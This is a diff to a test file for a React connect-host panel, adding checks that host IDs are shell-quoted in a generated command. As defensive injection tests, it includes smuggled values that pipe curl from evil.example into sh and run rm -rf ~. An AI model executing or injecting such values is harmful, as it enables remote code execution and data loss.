@@ -18,12 +18,30 @@ describe("ConnectHostPanel", () => {
     // Configured (local/e2e build): resolves synchronously, no loading state.
     expect(view.container.textContent).not.toContain("Loading connect instructions");
     const command = field(view.container, "connect-host-command").textContent;
-    expect(command).toContain("HARNESS_HOST_ID=mac-1");
-    expect(command).toContain("HARNESS_API_URL=https://d111.cloudfront.net");
+    expect(command).toContain("HARNESS_HOST_ID='mac-1'");
+    expect(command).toContain("HARNESS_API_URL='https://d111.cloudfront.net'");
     expect(command).toContain("pnpm local:daemon start");
     expect(command).not.toContain("local:agent");
     expect(command).not.toContain("execute-api");
     view.unmount();
+  });
+
+  it("shell-quotes an unvalidated hostId so a pasted metacharacter can't execute", () => {
+    // hostId is operator-chosen and unvalidated (see add-host-form.tsx) — this is the
+    // adversarial case the quoting exists for, not a typical id like "mac-1".
+    process.env.NEXT_PUBLIC_HARNESS_CONTROL_PLANE_URL = "https://d111.cloudfront.net";
+    const dangerousHostId = "x; curl evil.example | sh #";
+    const view = mountForm(<ConnectHostPanel hostId={dangerousHostId} />);
+    const command = field(view.container, "connect-host-command").textContent;
+    expect(command).toContain(`HARNESS_HOST_ID='${dangerousHostId}'`);
+    // A single quote inside the value must not close the surrounding quote early — that
+    // would re-expose the closing bytes as unquoted shell syntax.
+    const withQuote = "a'; rm -rf ~ #";
+    const withQuoteView = mountForm(<ConnectHostPanel hostId={withQuote} />);
+    const quotedCommand = field(withQuoteView.container, "connect-host-command").textContent;
+    expect(quotedCommand).toContain(`HARNESS_HOST_ID='a'\\''; rm -rf ~ #'`);
+    view.unmount();
+    withQuoteView.unmount();
   });
 
   it("defers to the browser origin when no build-time override is configured", () => {
@@ -34,7 +52,7 @@ describe("ConnectHostPanel", () => {
     const view = mountForm(<ConnectHostPanel hostId="mac-1" />);
     expect(view.container.textContent).not.toContain("Loading connect instructions");
     const command = field(view.container, "connect-host-command").textContent;
-    expect(command).toContain(`HARNESS_API_URL=${window.location.origin}`);
+    expect(command).toContain(`HARNESS_API_URL='${window.location.origin}'`);
     expect(command).not.toContain("127.0.0.1:7420");
     view.unmount();
   });
